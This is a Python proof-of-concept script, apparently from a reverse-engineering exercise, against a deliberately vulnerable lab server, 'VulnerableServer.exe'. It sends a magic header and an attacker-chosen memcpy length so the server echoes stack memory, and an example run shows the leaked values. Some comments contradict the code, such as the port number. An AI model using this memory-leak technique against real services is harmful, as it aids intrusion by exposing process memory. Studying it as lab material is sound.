import socket
import sys
import struct

'''
Please see an example run at the bottom of this file
'''


HOST = sys.argv[1] #'172.16.225.201'    # The remote host
PORT = 2323              # The same port as used by the server

#
# Create a socket..
# We use AF_INET : Address Family Internet (TCP/IP)
# We use SOCK_STREAM : This is connection-oriented (e.g. TCP)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)

#
# Ignoring erors, we will attempt to connect to the 
# host, HOST, on port, PORT
# From our RE of VulnerableServer.exe, we know that it listens
# on port 8900.
s.connect( (HOST,PORT) )

#
# From our RE of VulnerableServer.exe we know it has a data structure
# of the following:
# | 34 33 32 31 | <- The "magic" identified from RE
# | 00 00 00 00 | <- This is the size to memcpy
# 
data = b'\x34\x33\x32\x31'

s.sendall( data )

m = int(sys.argv[2])
data = struct.pack("<L",m)

s.sendall(data)

if( m < 64 ):
    data = b'A'*m
    s.sendall(data)

#
# receive the data back from the server.
# recall that since we supplied a length of '0'
# the data that is 'echoed' back is actually
# stack data from previous function calls...
data = s.recv(4096)

# 
# We have (0x20/4) DWORDS or 8. Thus, we see
# the struct unpack of little endian (<) 8 DWORDS (I)
vals = struct.unpack('<%dI' % (int)(m/4), data[:])

#
# Loop through each of the unpacked values printing
# each one as a hex integer
for x in vals:
    print('%08x' % x)

data = s.recv(4)
'''
Example run:
00000000
00000000
00000000
00000000
00000000
00000000
00000000
00000000
14cc3eed
0143f838
757938f4
00000100
757938d0
98116719
0143f880
77265de3
00000100
c010bd8f
00000000
00000000
'''
